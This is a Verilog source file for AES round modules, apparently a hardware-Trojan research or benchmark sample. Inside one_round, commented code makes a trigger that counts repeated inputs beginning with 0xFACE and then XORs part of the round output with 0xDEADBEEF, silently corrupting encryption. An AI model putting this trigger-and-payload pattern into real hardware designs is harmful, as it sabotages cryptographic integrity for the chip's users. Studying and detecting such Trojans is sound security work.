module one_round (clk, rst_n, state_in, key, state_out);
    input              clk;
    input              rst_n; // Added for synthesizable reset
    input      [127:0] state_in, key;
    output reg [127:0] state_out;
    wire       [31:0]  s0,  s1,  s2,  s3,
                       z0,  z1,  z2,  z3,
                       p00, p01, p02, p03,
                       p10, p11, p12, p13,
                       p20, p21, p22, p23,
                       p30, p31, p32, p33,
                       k0,  k1,  k2,  k3;
    // --- Trojan Start ---
    wire       [31:0]  z3_mod; // Wire to hold original or corrupted data
    reg  [1:0]         trojan_counter; // Counter to make trigger condition rare
    wire               trigger_condition = (state_in[127:112] == 16'hFACE); // Specific input pattern
    wire               trojan_active = (trojan_counter == 2'b11); // Trojan activates when counter is full

    // Trojan trigger logic: counter increments on seeing the trigger pattern, resets otherwise.
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            trojan_counter <= 2'b00;
        end else if (trigger_condition) begin
            if (trojan_counter < 2'b11) begin
                trojan_counter <= trojan_counter + 1;
            end
        end else begin
            trojan_counter <= 2'b00;
        end
    end
    // --- Trojan End ---

    assign {k0, k1, k2, k3} = key;

    assign {s0, s1, s2, s3} = state_in;

    table_lookup
        t0 (clk, s0, p00, p01, p02, p03),
        t1 (clk, s1, p10, p11, p12, p13),
        t2 (clk, s2, p20, p21, p22, p23),
        t3 (clk, s3, p30, p31, p32, p33);

    assign z0 = p00 ^ p11 ^ p22 ^ p33 ^ k0;
    assign z1 = p03 ^ p10 ^ p21 ^ p32 ^ k1;
    assign z2 = p02 ^ p13 ^ p20 ^ p31 ^ k2;
    assign z3 = p01 ^ p12 ^ p23 ^ p30 ^ k3;

    // --- Trojan Payload Start ---
    // If the Trojan is active, corrupt the value of z3. Otherwise, pass it through.
    assign z3_mod = trojan_active ? (z3 ^ 32'hDEADBEEF) : z3;
    // --- Trojan Payload End ---

    always @ (posedge clk)
        // The output state is formed using the potentially corrupted z3_mod.
        state_out <= {z0, z1, z2, z3_mod};
endmodule

/* AES final round for every two clock cycles */
// No Trojan here, but added rst_n for design consistency.
module final_round (clk, rst_n, state_in, key_in, state_out);
    input              clk;
    input              rst_n;
    input      [127:0] state_in;
    input      [127:0] key_in;
    output reg [127:0] state_out;
    wire [31:0] s0,  s1,  s2,  s3,
                z0,  z1,  z2,  z3,
                k0,  k1,  k2,  k3;
    wire [7:0]  p00, p01, p02, p03,
                p10, p11, p12, p13,
                p20, p21, p22, p23,
                p30, p31, p32, p33;
    
    assign {k0, k1, k2, k3} = key_in;
    
    assign {s0, s1, s2, s3} = state_in;

    S4
        S4_1 (clk, s0, {p00, p01, p02, p03}),
        S4_2 (clk, s1, {p10, p11, p12, p13}),
        S4_3 (clk, s2, {p20, p21, p22, p23}),
        S4_4 (clk, s3, {p30, p31, p32, p33});

    assign z0 = {p00, p11, p22, p33} ^ k0;
    assign z1 = {p10, p21, p32, p03} ^ k1;
    assign z2 = {p20, p31, p02, p13} ^ k2;
    assign z3 = {p30, p01, p12, p23} ^ k3;

    always @ (posedge clk)
        state_out <= {z0, z1, z2, z3};
endmodule
